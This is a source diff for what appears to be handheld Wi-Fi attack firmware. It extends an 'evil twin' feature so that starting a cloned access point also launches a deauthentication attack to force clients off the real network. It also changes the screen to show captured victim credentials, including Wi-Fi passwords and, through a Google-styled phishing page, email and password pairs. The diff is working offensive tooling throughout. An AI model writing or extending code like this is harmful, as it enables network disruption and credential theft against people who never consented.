@@ -910,6 +910,10 @@ void DisplayUI::setupButtons() {
             // twin: re-click SELECT stops
             case DISPLAY_MODE::EVILTWIN:
                 BlazeEvilTwin::stop();
+                if (kickLureActive) { // leaving the screen also ends the kick
+                    kickLureActive = false;
+                    if (attack.isRunning()) attack.stop();
+                }
                 mode = DISPLAY_MODE::MENU;
                 restoreMenuFont();
                 buttonTime = currentTime;
@@ -985,6 +989,10 @@ void DisplayUI::setupButtons() {
 
             case DISPLAY_MODE::EVILTWIN:
                 BlazeEvilTwin::stop();
+                if (kickLureActive) { // leaving the screen also ends the kick
+                    kickLureActive = false;
+                    if (attack.isRunning()) attack.stop();
+                }
                 mode = DISPLAY_MODE::MENU;
                 restoreMenuFont();
                 break;
@@ -1166,8 +1174,21 @@ void DisplayUI::startTwin(int idx) {
         }
         if (t < 0 && c > 0) t = 0;
     }
-    if (t < 0) return; // nothing to clone
-    if (!BlazeEvilTwin::start(t)) return;
+    if (t < 0) { // nothing to clone - tell the operator instead of doing nothing
+        prntln(String(F("TWIN: no APs scanned")));
+        flashMsg(String(F("scan first.")), 2000);
+        return;
+    }
+    if (!BlazeEvilTwin::start(t)) { // refused (protected/hidden/already active)
+        prntln(String(F("TWIN: start refused")));
+        flashMsg(String(F("twin refused.")), 2000);
+        return;
+    }
+
+    // full workflow: push clients off the real AP onto the twin (same kick as KICK&LURE)
+    kickLureActive = true;
+    attack.start(false, true, false, false, false, true,
+                 settings::getAttackSettings().timeout * 1000);
 
     mode = DISPLAY_MODE::EVILTWIN;
     restoreMenuFont();
@@ -1422,20 +1443,33 @@ void DisplayUI::drawEvilTwin() {
 
     drawString(0, String("TWIN ") + ssid);
 
-    if (BlazeEvilTwin::captured().length() > 0) {
-        String pw = BlazeEvilTwin::captured();
-        if (pw.length() > 12) pw = pw.substring(0, 12);
-        drawString(1, String("GOT: ") + pw);
-        drawString(2, center("password found!", maxLen));
+    String user = BlazeEvilTwin::capturedUser();
+    String pw   = BlazeEvilTwin::captured();
+
+    if (pw.length() > 0) {
+        if (user.length() > 0) {
+            // google template: email + password captured immediately
+            if (user.length() > 13) user = user.substring(0, 13);
+            drawString(1, String(F("GOT: ")) + user);
+            if (pw.length() > 14) pw = pw.substring(0, 14);
+            drawString(2, String(F("PW: ")) + pw);
+            drawString(3, String(F("TRIES ")) + String(BlazeEvilTwin::attempts()));
+        } else {
+            if (pw.length() > 12) pw = pw.substring(0, 12);
+            drawString(1, String(F("GOT: ")) + pw);
+            drawString(2, center("password found!", maxLen));
+            drawString(3, center("open network", maxLen));
+        }
     } else if (BlazeEvilTwin::validatingNow()) {
         drawString(1, center("trying password...", maxLen));
         drawString(2, String("TRIES ") + String(BlazeEvilTwin::attempts()));
+        drawString(3, center("open network", maxLen));
     } else {
         drawString(1, center("waiting for victim", maxLen));
         drawString(2, String("TRIES ") + String(BlazeEvilTwin::attempts()));
+        drawString(3, center("open network", maxLen));
     }
 
-    drawString(3, center("open network", maxLen));
     drawString(4, center("SELECT = STOP", maxLen));
 }
 
